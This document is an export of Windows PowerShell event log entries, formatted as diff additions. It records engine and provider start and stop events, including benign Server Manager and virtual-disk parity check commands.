+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=d42fe92b-e091-4498-8815-fb9f134b316a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:07 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:07 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:06 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=7316fedc-3ab6-4ec1-b898-41f3a2b028f2
+	HostApplication=C:\Windows\system32\ServerManager.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:10:50 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=2ecaf26d-b47c-488d-b622-beedb1019255
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:10:50 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f006ae17-644b-4fb7-8aae-2b7a6a8d64e8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:04 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=606599c1-d44a-4c21-b415-a574dd1f8e79
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=606599c1-d44a-4c21-b415-a574dd1f8e79
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=cfd7bd11-07fd-4938-a22d-9ece95b49209
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:55:00 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=d0397fdb-057d-40a9-916a-8003d1e57fd4
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:54:59 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=d0397fdb-057d-40a9-916a-8003d1e57fd4
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/29/2025 8:54:59 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e4b5d6a3-8292-4b2e-811c-775112c2ff9d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:22 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=ffc11ae8-252a-4b1a-ab52-9159c75794f0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=ffc11ae8-252a-4b1a-ab52-9159c75794f0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=83098ff6-0b0c-4afc-b51c-9805a4e1b9f0
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:11 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=6f6a67d1-1769-4ce8-8893-738c58f1ba18
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:09 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=6f6a67d1-1769-4ce8-8893-738c58f1ba18
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:08 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:08 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:08 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:08 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:08 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/28/2025 8:54:08 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=22c00ced-0057-42e0-8564-ce74c4cb25da
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
